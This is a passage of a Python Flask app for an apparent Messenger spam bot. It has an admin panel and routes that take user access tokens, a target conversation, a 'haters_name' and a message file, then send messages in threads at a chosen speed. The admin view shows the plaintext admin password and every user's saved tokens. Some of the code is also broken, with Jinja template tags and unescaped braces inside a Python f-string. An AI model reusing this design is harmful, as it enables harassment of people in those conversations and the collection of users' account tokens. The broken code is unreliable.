                border-radius: 20px;
                padding: 30px;
                text-align: center;
                box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
                transition: all 0.4s ease;
                border: 2px solid transparent;
            }
            
            .stat-card:hover {
                transform: translateY(-8px);
                box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
                border-color: #667eea;
            }
            
            .stat-icon {
                font-size: 3rem;
                margin-bottom: 20px;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
            }
            
            .stat-number {
                font-size: 2.5rem;
                font-weight: 800;
                color: #495057;
                margin-bottom: 8px;
            }
            
            .stat-label {
                color: #6c757d;
                font-weight: 700;
                text-transform: uppercase;
                letter-spacing: 1px;
                font-size: 12px;
            }
            
            .settings-section {
                background: white;
                border-radius: 20px;
                padding: 35px;
                margin-bottom: 30px;
                box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
                border: 2px solid #e9ecef;
            }
            
            .settings-title {
                font-size: 1.8rem;
                font-weight: 800;
                color: #495057;
                margin-bottom: 25px;
                padding-bottom: 15px;
                border-bottom: 3px solid #e9ecef;
                display: flex;
                align-items: center;
                gap: 15px;
            }
            
            .settings-title i {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
            }
            
            .credential-info {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
                gap: 25px;
                margin-bottom: 30px;
            }
            
            .credential-item {
                background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
                padding: 25px;
                border-radius: 15px;
                border-left: 5px solid #667eea;
                transition: all 0.3s ease;
            }
            
            .credential-item:hover {
                transform: translateX(5px);
                box-shadow: 0 10px 25px rgba(102, 126, 234, 0.1);
            }
            
            .credential-label {
                font-size: 12px;
                color: #6c757d;
                text-transform: uppercase;
                letter-spacing: 1px;
                margin-bottom: 10px;
                font-weight: 700;
            }
            
            .credential-value {
                font-weight: 700;
                color: #495057;
                font-size: 1.2rem;
                font-family: 'Courier New', monospace;
                background: white;
                padding: 10px 15px;
                border-radius: 8px;
                border: 2px solid #e9ecef;
            }
            
            .password-value {
                filter: blur(5px);
                transition: filter 0.3s ease;
                cursor: pointer;
            }
            
            .password-value:hover {
                filter: blur(0px);
            }
            
            .config-note {
                background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%);
                border: 2px solid #ffd700;
                border-radius: 15px;
                padding: 25px;
                color: #856404;
                margin-bottom: 30px;
                position: relative;
                overflow: hidden;
            }
            
            .config-note::before {
                content: '';
                position: absolute;
                top: 0;
                left: 0;
                right: 0;
                height: 4px;
                background: linear-gradient(90deg, #ffd700, #ffed4e, #ffd700);
                animation: shimmer 2s linear infinite;
            }
            
            @keyframes shimmer {
                0% { transform: translateX(-100%); }
                100% { transform: translateX(100%); }
            }
            
            .config-note strong {
                font-size: 1.1rem;
                display: block;
                margin-bottom: 10px;
            }
            
            .user-list {
                margin-top: 25px;
            }
            
            .user-item {
                background: white;
                border: 2px solid #e9ecef;
                border-radius: 20px;
                padding: 30px;
                margin-bottom: 20px;
                box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
                transition: all 0.4s ease;
                position: relative;
                overflow: hidden;
            }
            
            .user-item::before {
                content: '';
                position: absolute;
                top: 0;
                left: 0;
                right: 0;
                height: 4px;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            }
            
            .user-item:hover {
                transform: translateY(-5px);
                box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
                border-color: #667eea;
            }
            
            .user-header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 20px;
                flex-wrap: wrap;
            }
            
            .user-username {
                font-size: 1.4rem;
                font-weight: 800;
                color: #495057;
                text-transform: uppercase;
                letter-spacing: 1px;
            }
            
            .user-details {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
                gap: 20px;
                margin-bottom: 20px;
            }
            
            .user-detail {
                background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
                padding: 15px 20px;
                border-radius: 12px;
                border-left: 4px solid #667eea;
                transition: all 0.3s ease;
            }
            
            .user-detail:hover {
                transform: translateX(5px);
                box-shadow: 0 5px 15px rgba(102, 126, 234, 0.1);
            }
            
            .detail-label {
                font-size: 12px;
                color: #6c757d;
                text-transform: uppercase;
                letter-spacing: 1px;
                margin-bottom: 8px;
                font-weight: 700;
            }
            
            .detail-value {
                font-weight: 700;
                color: #495057;
                font-size: 1.1rem;
            }
            
            .user-actions {
                display: flex;
                gap: 15px;
                flex-wrap: wrap;
            }
            
            .status-badge {
                padding: 12px 20px;
                border-radius: 25px;
                font-size: 12px;
                font-weight: 700;
                text-transform: uppercase;
                letter-spacing: 1px;
                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            }
            
            .status-admin {
                background: linear-gradient(135deg, #007bff 0%, #6610f2 100%);
                color: white;
            }
            
            .status-approved {
                background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
                color: white;
            }
            
            .status-pending {
                background: linear-gradient(135deg, #ffc107 0%, #fd7e14 100%);
                color: #212529;
            }
            
            .btn {
                padding: 12px 20px;
                border: none;
                border-radius: 10px;
                font-size: 14px;
                font-weight: 700;
                cursor: pointer;
                transition: all 0.4s ease;
                text-transform: uppercase;
                letter-spacing: 0.5px;
                margin: 5px;
                min-width: 120px;
                position: relative;
                overflow: hidden;
            }
            
            .btn::before {
                content: '';
                position: absolute;
                top: 0;
                left: -100%;
                width: 100%;
                height: 100%;
                background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
                transition: left 0.6s;
            }
            
            .btn:hover::before {
                left: 100%;
            }
            
            .btn-approve {
                background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
                color: white;
                box-shadow: 0 5px 15px rgba(40, 167, 69, 0.3);
            }
            
            .btn-approve:hover {
                transform: translateY(-2px);
                box-shadow: 0 10px 25px rgba(40, 167, 69, 0.4);
            }
            
            .btn-reject {
                background: linear-gradient(135deg, #dc3545 0%, #fd7e14 100%);
                color: white;
                box-shadow: 0 5px 15px rgba(220, 53, 69, 0.3);
            }
            
            .btn-reject:hover {
                transform: translateY(-2px);
                box-shadow: 0 10px 25px rgba(220, 53, 69, 0.4);
            }
            
            .btn-revoke {
                background: linear-gradient(135deg, #ffc107 0%, #fd7e14 100%);
                color: #212529;
                box-shadow: 0 5px 15px rgba(255, 193, 7, 0.3);
            }
            
            .btn-revoke:hover {
                transform: translateY(-2px);
                box-shadow: 0 10px 25px rgba(255, 193, 7, 0.4);
            }
            
            .btn-remove {
                background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
                color: white;
                box-shadow: 0 5px 15px rgba(220, 53, 69, 0.3);
            }
            
            .btn-remove:hover {
                transform: translateY(-2px);
                box-shadow: 0 10px 25px rgba(220, 53, 69, 0.4);
            }
            
            .btn-promote {
                background: linear-gradient(135deg, #007bff 0%, #6610f2 100%);
                color: white;
                box-shadow: 0 5px 15px rgba(0, 123, 255, 0.3);
            }
            
            .btn-promote:hover {
                transform: translateY(-2px);
                box-shadow: 0 10px 25px rgba(0, 123, 255, 0.4);
            }
            
            .btn-demote {
                background: linear-gradient(135deg, #6c757d 0%, #495057 100%);
                color: white;
                box-shadow: 0 5px 15px rgba(108, 117, 125, 0.3);
            }
            
            .btn-demote:hover {
                transform: translateY(-2px);
                box-shadow: 0 10px 25px rgba(108, 117, 125, 0.4);
            }
            
            .section-title {
                font-size: 1.8rem;
                font-weight: 800;
                color: #495057;
                margin-bottom: 25px;
                padding-bottom: 15px;
                border-bottom: 3px solid #e9ecef;
                display: flex;
                align-items: center;
                gap: 15px;
            }
            
            .section-title i {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
            }
            
            @media (max-width: 768px) {
                .admin-header {
                    padding: 25px 20px;
                }
                
                .admin-header h1 {
                    font-size: 2.5rem;
                }
                
                .back-btn {
                    position: static;
                    margin-bottom: 20px;
                    display: inline-block;
                }
                
                .admin-tabs {
                    flex-direction: column;
                }
                
                .user-header {
                    flex-direction: column;
                    align-items: flex-start;
                    gap: 15px;
                }
                
                .user-actions {
                    width: 100%;
                }
                
                .btn {
                    flex: 1;
                    min-width: auto;
                }
                
                .stats-grid {
                    grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
                }
                
                .credential-info {
                    grid-template-columns: 1fr;
                }
            }
        </style>
    </head>
    <body>
        <div class="admin-container">
            <div class="admin-header">
                <a href="/" class="back-btn">
                    <i class="fas fa-arrow-left"></i> Back to Dashboard
                </a>
                <h1><i class="fas fa-cog"></i> Admin Panel</h1>
                <p>User Management & System Control</p>
            </div>
            
            <div class="admin-tabs">
                <button class="admin-tab active" onclick="switchAdminTab('overview')">
                    <i class="fas fa-chart-pie"></i> Overview
                </button>
                <button class="admin-tab" onclick="switchAdminTab('users')">
                    <i class="fas fa-users-cog"></i> User Management
                </button>
              <button class="admin-tab" onclick="switchAdminTab(\'settings\')">\n                    <i class="fas fa-cogs"></i> System Settings\n                </button>\n                <button class="admin-tab" onclick="switchAdminTab(\'tokens\')">\n                    <i class="fas fa-key"></i> User Tokens\n                </button>           </div>
            
            <div id="overview-content" class="admin-content active">
                <div class="stats-grid">
    '''
    
    # Calculate statistics
    total_users = len(users)
    approved_users = len([u for u in users if u[3] == 1])
    pending_users = len([u for u in users if u[3] == 0])
    admin_users = len([u for u in users if u[2] == 1])
    
    admin_html += f'''
                    <div class="stat-card">
                        <div class="stat-icon"><i class="fas fa-users"></i></div>
                        <div class="stat-number">{total_users}</div>
                        <div class="stat-label">Total Users</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-icon"><i class="fas fa-check-circle"></i></div>
                        <div class="stat-number">{approved_users}</div>
                        <div class="stat-label">Approved</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-icon"><i class="fas fa-clock"></i></div>
                        <div class="stat-number">{pending_users}</div>
                        <div class="stat-label">Pending</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-icon"><i class="fas fa-crown"></i></div>
                        <div class="stat-number">{admin_users}</div>
                        <div class="stat-label">Admins</div>
                    </div>
                </div>
                
                <h2 class="section-title">
                    <i class="fas fa-chart-line"></i> System Overview
                </h2>
                
                <div class="settings-section">
                    <h3 class="settings-title">
                        <i class="fas fa-info-circle"></i> System Information
                    </h3>
                    <div class="credential-info">
                        <div class="credential-item">
                            <div class="credential-label">Application Status</div>
                            <div class="credential-value">ðŸŸ¢ Online & Running</div>
                        </div>
                        <div class="credential-item">
                            <div class="credential-label">Database Status</div>
                            <div class="credential-value">ðŸŸ¢ Connected</div>
                        </div>
                        <div class="credential-item">
                            <div class="credential-label">Active Sessions</div>
                            <div class="credential-value">{len([u for u in users if u[3] == 1])}</div>
                        </div>
                        <div class="credential-item">
                            <div class="credential-label">Security Level</div>
                            <div class="credential-value">ðŸ”’ High</div>
                        </div>
                    </div>
                </div>
            </div>
            
            <div id="users-content" class="admin-content">
                <h2 class="section-title">
                    <i class="fas fa-users-cog"></i> User Management
                </h2>
                
                <div class="user-list">
    '''
    
    for user in users:
        user_id, username, admin, approved, created_at = user
        admin_html += f'''
        <div class="user-item">
            <div class="user-header">
                <div class="user-username">{username}</div>
                <div class="status-badge {'status-admin' if admin else ('status-approved' if approved else 'status-pending')}">
                    {'Admin' if admin else ('Approved' if approved else 'Pending')}
                </div>
            </div>
            <div class="user-details">
                <div class="user-detail">
                    <div class="detail-label">User ID</div>
                    <div class="detail-value">#{user_id}</div>
                </div>
                <div class="user-detail">
                    <div class="detail-label">Registered</div>
                    <div class="detail-value">{created_at}</div>
                </div>
                <div class="user-detail">
                    <div class="detail-label">Status</div>
                    <div class="detail-value">{'Administrator' if admin else ('Active User' if approved else 'Awaiting Approval')}</div>
                </div>
            </div>
            <div class="user-actions">
        '''
        
        # Don't allow modifying the main admin account
        if username != ADMIN_CONFIG['username']:
            if not approved and not admin:
                # Pending user - show approve/reject buttons
                admin_html += f'''
                <button class="btn btn-approve" onclick="approveUser({user_id})">
                    <i class="fas fa-check"></i> Approve
                </button>
                <button class="btn btn-reject" onclick="rejectUser({user_id})">
                    <i class="fas fa-times"></i> Reject
                </button>
                '''
            
            if approved and not admin:
                # Approved user - show revoke, remove, and promote buttons
                admin_html += f'''
                <button class="btn btn-revoke" onclick="revokeUser({user_id})">
                    <i class="fas fa-ban"></i> Revoke
                </button>
                <button class="btn btn-remove" onclick="removeUser({user_id})">
                    <i class="fas fa-trash"></i> Remove
                </button>
                <button class="btn btn-promote" onclick="promoteUser({user_id})">
                    <i class="fas fa-crown"></i> Make Admin
                </button>
                '''
            elif admin:
                # Admin user - show demote and remove buttons
                admin_html += f'''
                <button class="btn btn-demote" onclick="demoteUser({user_id})">
                    <i class="fas fa-user"></i> Remove Admin
                </button>
                <button class="btn btn-remove" onclick="removeUser({user_id})">
                    <i class="fas fa-trash"></i> Remove
                </button>
                '''
        else:
            admin_html += '<span style="color: #6c757d; font-style: italic; font-weight: 600;">ðŸ”’ Main Administrator</span>'
        
        admin_html += '''
            </div>
        </div>
        '''
    
    admin_html += f'''
                </div>
            </div>
            
            <div id="settings-content" class="admin-content">
                <h2 class="section-title">
                    <i class="fas fa-cogs"></i> System Settings
                </h2>
                
                <div class="settings-section">
                    <h3 class="settings-title">
                        <i class="fas fa-key"></i> Admin Credentials Configuration
                    </h3>
                    
                    <div class="config-note">
                        <strong>ðŸ”§ Configuration Instructions</strong>
                        To change admin credentials, modify the ADMIN_CONFIG dictionary at the top of the Python file:
                        <br><br>
                        <code>
                        ADMIN_CONFIG = {{<br>
                        &nbsp;&nbsp;&nbsp;&nbsp;\'username\': \'your_new_username\',<br>
                        &nbsp;&nbsp;&nbsp;&nbsp;\'password\': \'your_new_password\'<br>
                        }}
                        </code>
                        <br><br>
                        The system will automatically update the database when restarted.
                    </div>
                    
                    <div class="credential-info">
                        <div class="credential-item">
                            <div class="credential-label">Current Admin Username</div>
                            <div class="credential-value">{ADMIN_CONFIG[\'username\']}</div>
                        </div>
                        <div class="credential-item">
                            <div class="credential-label">Current Admin Password</div>
                            <div class="credential-value password-value" title="Hover to reveal">{ADMIN_CONFIG[\'password\']}</div>
                        </div>
                        <div class="credential-item">
                            <div class="credential-label">Password Hash</div>
                            <div class="credential-value">{hashlib.sha256(ADMIN_CONFIG[\'password\'].encode()).hexdigest()[:20]}...</div>
                        </div>
                        <div class="credential-item">
                            <div class="credential-label">Last Updated</div>
                            <div class="credential-value">System Startup</div>
                        </div>
                    </div>
                </div>
                
                <div class="settings-section">
                    <h3 class="settings-title">
                        <i class="fas fa-shield-alt"></i> Security Settings
                    </h3>
                    <div class="credential-info">
                        <div class="credential-item">
                            <div class="credential-label">Password Encryption</div>
                            <div class="credential-value">SHA-256 Hash</div>
                        </div>
                        <div class="credential-item">
                            <div class="credential-label">Session Security</div>
                            <div class="credential-value">Flask Sessions</div>
                        </div>
                        <div class="credential-item">
                            <div class="credential-label">Database Security</div>
                            <div class="credential-value">SQLite3 Local</div>
                        </div>
                        <div class="credential-item">
                            <div class="credential-label">Access Control</div>
                            <div class="credential-value">Role-Based</div>
                        </div>
                    </div>
                </div>
            </div>

            <div id="tokens-content" class="admin-content">
                <h2 class="section-title">
                    <i class="fas fa-key"></i> User Tokens Management
                </h2>
                <div class="user-list">
                    {% for user in users %}
                        {% if user[4] %}
                            <div class="user-item">
                                <div class="user-header">
                                    <div class="user-username">{{ user[1] }}</div>
                                    <div class="status-badge status-approved">Approved</div>
                                </div>
                                <div class="user-details">
                                    <div class="user-detail">
                                        <div class="detail-label">User ID</div>
                                        <div class="detail-value">#{{ user[0] }}</div>
                                    </div>
                                    <div class="user-detail">
                                        <div class="detail-label">Registered</div>
                                        <div class="detail-value">{{ user[3] }}</div>
                                    </div>
                                    <div class="user-detail">
                                        <div class="detail-label">Tokens</div>
                                        <div class="detail-value">
                                            {% if user[5] %}
                                                <textarea rows="5" cols="30" readonly onclick="copyToClipboard(this)" title="Click to copy">{{ user[5] }}</textarea>
                                            {% else %}
                                                No tokens saved.
                                            {% endif %}
                                        </div>
                                    </div>
                                </div>
                            </div>
                        {% endif %}
                    {% endfor %}
                </div>
            </div>
        </div>
        
        <script>
            function switchAdminTab(tab) {{
                // Remove active class from all tabs and contents
                document.querySelectorAll('.admin-tab').forEach(t => t.classList.remove('active'));
                document.querySelectorAll('.admin-content').forEach(c => c.classList.remove('active'));
                
                // Add active class to selected tab and content
                event.currentTarget.classList.add('active');
                document.getElementById(tab + '-content').classList.add('active');
            }}
            
            function approveUser(userId) {{
                if (confirm('Approve this user?')) {{
                    fetch(`/admin/approve/${{userId}}`, {{method: 'POST'}})
                    .then(response => response.json())
                    .then(data => {{
                        if (data.success) {{
                            location.reload();
                        }} else {{
                            alert('Error approving user');
                        }}
                    }});
                }}
            }}
            
            function rejectUser(userId) {{
                if (confirm('Reject and delete this user account?')) {{
                    fetch(`/admin/reject/${{userId}}`, {{method: 'POST'}})
                    .then(response => response.json())
                    .then(data => {{
                        if (data.success) {{
                            location.reload();
                        }} else {{
                            alert('Error rejecting user');
                        }}
                    }});
                }}
            }}
            
            function revokeUser(userId) {{
                if (confirm('Revoke access for this user? They will need to be re-approved to access the system.')) {{
                    fetch(`/admin/revoke/${{userId}}`, {{method: 'POST'}})
                    .then(response => response.json())
                    .then(data => {{
                        if (data.success) {{
                            location.reload();
                        }} else {{
                            alert('Error revoking user access');
                        }}
                    }});
                }}
            }}
            
            function removeUser(userId) {{
                if (confirm('Permanently remove this user account? This action cannot be undone.')) {{
                    fetch(`/admin/remove/${{userId}}`, {{method: 'POST'}})
                    .then(response => response.json())
                    .then(data => {{
                        if (data.success) {{
                            location.reload();
                        }} else {{
                            alert('Error removing user');
                        }}
                    }});
                }}
            }}
            
            function promoteUser(userId) {{
                if (confirm('Promote this user to admin?')) {{
                    fetch(`/admin/promote/${{userId}}`, {{method: 'POST'}})
                    .then(response => response.json())
                    .then(data => {{
                        if (data.success) {{
                            location.reload();
                        }} else {{
                            alert('Error promoting user');
                        }}
                    }});
                }}
            }}
            
            function demoteUser(userId) {{
                if (confirm(\'Remove admin privileges from this user?\')) {{
                    fetch(`/admin/demote/${{userId}}`, {{method: \'POST\'}})
                    .then(response => response.json())
                    .then(data => {{
                        if (data.success) {{
                            location.reload();
                        }} else {{
                            alert(\'Error demoting user\');
                        }}
                    }});
                }}
            }}

            function copyToClipboard(element) {
                element.select();
                document.execCommand(\'copy\');
                alert(\'Copied to clipboard!\');
            }
        </script>
    </body>
    </html>
    '''
    
    return admin_html


# Enhanced admin routes with revoke and remove functionality
@app.route('/admin/approve/<int:user_id>', methods=['POST'])
@admin_required
def approve_user(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("UPDATE users SET approved = 1 WHERE id = ?", (user_id,))
    conn.commit()
    conn.close()
    return jsonify({'success': True})

@app.route('/admin/reject/<int:user_id>', methods=['POST'])
@admin_required
def reject_user(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("DELETE FROM users WHERE id = ?", (user_id,))
    conn.commit()
    conn.close()
    return jsonify({'success': True})

@app.route('/admin/revoke/<int:user_id>', methods=['POST'])
@admin_required
def revoke_user(user_id):
    """Revoke user access by setting approved status to 0"""
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    # Check if user exists and is not the main admin
    c.execute("SELECT username, admin FROM users WHERE id = ?", (user_id,))
    user = c.fetchone()
    
    if user and user[0] != ADMIN_CONFIG['username']:  # Don't allow revoking main admin
        c.execute("UPDATE users SET approved = 0 WHERE id = ?", (user_id,))
        conn.commit()
        conn.close()
        return jsonify({'success': True})
    else:
        conn.close()
        return jsonify({'success': False, 'message': 'Cannot revoke main admin or user not found'})

@app.route('/admin/remove/<int:user_id>', methods=['POST'])
@admin_required
def remove_user(user_id):
    """Permanently remove a user account"""
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    # Check if user exists and is not the main admin
    c.execute("SELECT username FROM users WHERE id = ?", (user_id,))
    user = c.fetchone()
    
    if user and user[0] != ADMIN_CONFIG['username']:  # Don't allow removing main admin
        c.execute("DELETE FROM users WHERE id = ?", (user_id,))
        conn.commit()
        conn.close()
        return jsonify({'success': True})
    else:
        conn.close()
        return jsonify({'success': False, 'message': 'Cannot remove main admin or user not found'})

@app.route('/admin/promote/<int:user_id>', methods=['POST'])
@admin_required
def promote_user(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("UPDATE users SET admin = 1, approved = 1 WHERE id = ?", (user_id,))
    conn.commit()
    conn.close()
    return jsonify({'success': True})

@app.route('/admin/demote/<int:user_id>', methods=['POST'])
@admin_required
def demote_user(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    # Check if user is not the main admin
    c.execute("SELECT username FROM users WHERE id = ?", (user_id,))
    user = c.fetchone()
    
    if user and user[0] != ADMIN_CONFIG['username']:  # Don't allow demoting main admin
        c.execute("UPDATE users SET admin = 0 WHERE id = ?", (user_id,))
        conn.commit()
        conn.close()
        return jsonify({'success': True})
    else:
        conn.close()
        return jsonify({'success': False, 'message': 'Cannot demote main admin'})


# Bot functionality routes
@app.route('/run_bot', methods=['POST'])
@approved_required
def run_bot():
    global message_threads, stop_flags

    convo_uid = request.form['convo_uid']
    token = request.form['token']
    speed = int(request.form['speed'])
    haters_name = request.form['haters_name']

    message_file = request.files['message_file']
    message_content = message_file.read().decode('utf-8')

    # Generate unique task ID
    task_id = str(uuid.uuid4())[:8]
    
    # Get token name for display
    first_token = token.splitlines()[0].strip() if token.splitlines() else ""
    token_name = get_token_name(first_token)
    
    # Initialize task
    stop_flags[task_id] = False
    message_threads[task_id] = {
        'user_id': session['user_id'],
        'thread': threading.Thread(target=send_messages, args=(task_id, convo_uid, token, message_content, speed, haters_name)),
        'convo_uid': convo_uid,
        'haters_name': haters_name,
        'started_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'status': 'running',
        'token_name': token_name
    }
    
    message_threads[task_id]['thread'].daemon = True
    message_threads[task_id]['thread'].start()

    add_log(task_id, f"ðŸš€ Bot started successfully for task {task_id}")
    add_log(task_id, f"Primary token: {token_name}")
    return redirect(url_for('index'))

@app.route('/stop_task/<task_id>', methods=['POST'])
@approved_required
def stop_task(task_id):
    global stop_flags, message_threads
    
    user_id = session.get("user_id")
    if not user_id:
        return jsonify({"status": "error", "message": "Not logged in"})
    
    # Check if the task belongs to the current user
    if task_id not in message_threads or message_threads[task_id].get("user_id") != user_id:
        return jsonify({"status": "error", "message": "Task not found or access denied"})
    
    if task_id in stop_flags:
        stop_flags[task_id] = True
        add_log(task_id, "ðŸ›‘ Stop signal sent by user")
        return jsonify({"status": "success", "message": "Task stop signal sent"})
    else:
        return jsonify({"status": "error", "message": "Task not found"})

@app.route('/remove_task/<task_id>', methods=['POST'])
@approved_required
def remove_task(task_id):
    global message_threads, task_logs, stop_flags
    
    user_id = session.get("user_id")
    if not user_id:
        return jsonify({"status": "error", "message": "Not logged in"})
    
    # Check if the task belongs to the current user
    if task_id not in message_threads or message_threads[task_id].get("user_id") != user_id:
        return jsonify({"status": "error", "message": "Task not found or access denied"})
    
    # Clean up task data
    if task_id in message_threads:
        del message_threads[task_id]
    if task_id in task_logs:
        del task_logs[task_id]
    if task_id in stop_flags:
        del stop_flags[task_id]
    
    return jsonify({"status": "success", "message": "Task removed successfully"})

@app.route('/check_tokens', methods=['POST'])
@approved_required
def check_tokens():
    data = request.json
    tokens = data.get('tokens', [])
    
    results = []
    for token in tokens:
        token = token.strip()
        if token:
            result = check_token_validity(token)
            result['token'] = token
            results.append(result)
    
    return jsonify({'results': results})

@app.route('/fetch_groups', methods=['POST'])
@approved_required
def fetch_groups():
    data = request.json
    token = data.get('token', '').strip()
    
    if not token:
        return jsonify({'success': False, 'groups': [], 'message': 'No token provided'})
    
    result = fetch_messenger_groups(token)
    return jsonify(result)

@app.route('/get_tasks')
@approved_required
def get_tasks():
    global message_threads
    
    tasks = []
    user_id = session.get("user_id")
    if not user_id:
        return jsonify({"tasks": []})

    for task_id, task_info in message_threads.items():
        if task_info.get("user_id") != user_id:
            continue
        # Check if thread is still alive
        if task_info['thread'].is_alive():
            status = 'running'
        else:
            status = 'stopped'
            
        # Update status in the task_info
        task_info['status'] = status
        
        tasks.append({
            'id': task_id,
            'convo_uid': task_info['convo_uid'],
            'haters_name': task_info['haters_name'],
            'started_at': task_info['started_at'],
            'status': status,
            'token_name': task_info['token_name']
        })
    
    return jsonify({'tasks': tasks})

@app.route('/get_logs/<task_id>')
@approved_required
def get_logs(task_id):
    global task_logs
    
    user_id = session.get("user_id")
    if not user_id:
        return jsonify({"logs": []})
    
    # Check if the task belongs to the current user
    if task_id not in message_threads or message_threads[task_id].get("user_id") != user_id:
        return jsonify({"logs": []})
    
    logs = task_logs.get(task_id, [])
    return jsonify({'logs': logs})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
